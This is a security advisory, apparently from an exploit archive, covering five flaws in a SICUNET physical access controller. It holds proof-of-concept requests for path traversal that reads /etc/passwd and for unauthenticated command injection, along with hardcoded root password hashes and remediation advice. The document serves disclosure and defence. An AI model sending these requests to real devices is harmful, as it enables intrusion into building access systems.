@@ -1,0 +1,272 @@
+id: 27281
+date: 03/10/2017
+title: SICUNET Access Controller 0.32-05z Code Execution / File Disclosure Vulnerabilities
+author: Andrew Griffiths
+cves: 
+
+SICUNET Physical Access Controller - Multiple Vulnerabilities
+
+-------------------------------------------------------------
+
+Introduction
+
+============
+
+Multiple vulnerabilities were identified in the SICUNET Access Controller
+Products. The vulnerabilities were discovered during a black box security
+assessment and therefore the vulnerability list should not be considered
+exhaustive.
+
+Affected Software and Versions
+
+==============================
+
+Known vulnerable version is 0.32-05z. This version string was taken from
+Spider.db.
+
+CVE
+
+===
+
+No CVEs have been assigned.
+
+Vulnerability Overview
+
+======================
+
+0. SN-01: HIGH: Outdated software
+
+1. SN-02: HIGH: PHP include()
+
+2. SN-03: CRITICAL: Unauthenticated remote code execution
+
+3. SN-04: CRITICAL: Hardcoded root credentials
+
+4. SN-05: High: Passwords stored in plaintext
+
+Vulnerability Details
+
+=====================
+
+------------------------
+
+SN-01: Outdated software
+
+------------------------
+
+Severity: High
+
+A variety of software running on the device is outdated, making
+exploitation of certain bugs far easier than it would be had they been
+patched, or running up to date software.
+
+ /usr/local/php_b2/bin # ./php -v
+
+ PHP 5.2.14 (cli) (built: Jul  8 2012 22:45:11)
+
+ Copyright (c) 1997-2010 The PHP Group
+
+ Zend Engine v2.2.0, Copyright (c) 1998-2010 Zend Technologies
+
+http://php.net/eol.php has more information about PHP 5.2 being End Of
+Life, and associated security issues.
+
+ /usr/local/lighttpd/sbin # ./arm-linux-lighttpd -v
+
+ lighttpd/1.4.30 (ssl) - a light and fast webserver
+
+ Build-Date: Dec 26 2013 15:13:53
+
+https://www.lighttpd.net/download/ has more information about security
+changes in lighttpd.
+
+ # uname -a
+ Linux SICUNET 2.6.32.9 #72 PREEMPT Tue Feb 28 15:25:12 KST 2012 armv7l
+ GNU/Linux
+
+
+It is recommended that software is kept up to date, and that configurations
+are reviewed to ensure that theyare secure. For example, there may have
+been configuration options for PHP which may have made exploitation harder.
+
+--------------------
+
+SN-02: PHP include()
+
+--------------------
+
+Severity: High
+
+When sending a request to /, the 'c' parameter is used as part of an
+include() statement.
+
+Excerpt from /spider/web/webroot/index.php:
+
+ $class  = Input::get('c', 'layout');
+ $method = Input::get('m', 'index');
+
+ include APP_DIR.'/controllers/'.$class.EXT;
+
+(where EXT is defined as '.phpa).
+
+By crafting the c parameter, itas possible to access arbitrary files on the
+device:
+
+ wget 'http://victim.ip.address/?c=../../../../../etc/passwd%00'
+
+The %00 trick is a known issue, and is addressed in a later PHP update. For
+more information, please see SN-01.
+
+It is recommended that the code be refactored to not require passing user
+supplied input to the include() function. Alternatively, a strict whitelist
+approach of known modules may be used instead.
+
+--------------------------------------------
+
+SN-03: Unauthenticated remote code execution
+
+--------------------------------------------
+
+Severity: Critical
+
+A variety of functionality is implemented via insecure string concatenation
+then passed to underlying exec() functions:
+
+For example, in card_scan_decoder.php
+
+16     $No = $_GET['No'];
+17     $door = $_GET['door'];
+18
+19     $result = array();
+20
+21     $db   = new PDO('sqlite:/tmp/SpiderDB/Spider.db');
+<snip>
+
+27
+28     if ($No < 1)
+29     {
+30         $DelTemp = $db->prepare("DELETE FROM CardRawData");
+31         $DelTemp->execute();
+32
+33         exec("/spider/sicu/spider-cgi getrawdata ".$door." on");
+34     }
+
+This vulnerability can be exploited by:
+
+ wget 'http://victim.ip.address/card_scan_decoder.php?No=0&door=$(sleep 3)a
+
+This is just an example of the pattern of insecurely creating strings to be
+executed, and not an exhaustive listing.
+
+It is recommended that injection-proof API's are used instead of
+error-prone string concatenation, or whitelist / blacklist being used (for
+example, escapeshellcmd). However, it appears as if the closest option in
+PHP is http://php.net/manual/en/function.pcntl-exec.php which requires the
+user to perform a lot more work to avoid shooting themselves in the foot
+(such as forking the process first).
+
+---------------------------------
+
+SN-04: Hardcoded root credentials
+
+---------------------------------
+
+Severity: Critical
+
+There are 3 password fingerprints in /etc/passwd
+
+ root:$1$VVtYRWvv$gyIQsOnvSv53KQwzEfZpJ0:0:100:root:/root:/bin/sh
+ e3user:$1$vR6H2PUd$52r03jiYrM6m5Bff03yT0/:1000:1000:Linux
+User,,,:/home/e3user:/bin/sh
+ lighttpd:$1$vqbixaUx$id5O6Pnoi5/fXQzE484CP1:1001:1000:Linux
+User,,,:/home/lighttpd:/bin/sh
+
+The plaintext root password can be found in /spider/sicu binaries. The root
+password may be used for the ftp or telnet service on the device. From our
+observation, it appears as if FTP is running by default, along with the
+ability to login as root via FTP.
+
+The hardcoded root credentials are used by binaries on the system to run
+commands as root. It is currently unknown what the purpose of the e3user
+and lighttpd hardcoded passwords are.
+
+For example, the root password is used in a variety of ways in the
+following format:
+
+ echo %s | su -c 'mkdir -p %s >& /tmp/message'
+ echo %s | su -c 'chown %s %s >& /tmp/message'
+
+Where %s is replaced at run time with the cleartext root password before
+being passed to the system() function.
+
+It is recommended that hardcoded credentials be removed, and instead
+replaced with a more suitable mechanism. For example; sudo may be suitable,
+combined with the NOPASSWD directive.
+
+FTP access should be replaced with a more secure transfer mechanism (such
+as SSH FTP, or SCP), and authentication should be managed by a user
+(preferably via SSH public keys).
+
+------------------------------------------
+
+SN-05: Passwords stored in plaintext
+
+------------------------------------------
+
+Severity: High
+
+A variety of credentials (for example, used for accessing the web front
+end, or other devices part of the installation) are stored unencrypted on
+the device in /tmp/SpiderDB/Spider.db:
+
+sqlite> SELECT Name,Password FROM WebUser;
+admin|ExamplePlaintextPassword
+sqlite> SELECT Name,ID,Password FROM Controller;
+Server|username|AnotherPlaintextPassword
+
+It is recommended that where passwords must be stored, that they are
+suitably cryptographically hashed using an appropriate standard (for more
+information, please see https://password-hashing.net).
+
+Author
+
+======
+
+The vulnerabilities were discovered by Andrew Griffiths from Google
+Security Team.
+
+Timeline
+
+========
+
+2016/12/06 - Contacted sicunet.com domain registrar, and sales@sicunet.com
+            for a point of contact to report security issues.
+
+2016/12/08 - Pinged earlier email for a point of contact, additionally
+            included tech@sicunet.com on an email.
+
+2016/12/08 - Report sent to Ike Huh, CEO.
+
+2016/12/12 - Mentioned that reviewing spider-api would be worthwhile as it
+            listens on port 7000, and strings suggests that there may be
+            command injection / other vulnerabilities. No reply.
+
+2017/01/17 - Asked point of contact if they had any questions about the
+            advisory sent earlier. No reply.
+
+2017/01/24 - Pinged vendor again, asked about resellers who may be able to
+            make recommendations about restricting network access to the
+            devices from the internet.
+
+2017/01/30 - No contact from vendor.
+
+2017/02/24 - Asked vendor if the affected users can expect patches. No
+            reply.
+
+2017/03/01 - Sent an email to the vendor, reminding them disclosure is
+coming
+            up soon.
+
+2017/03/08 - 90 day disclosure deadline.
+
+#  0day.today [2023-03-24]  #
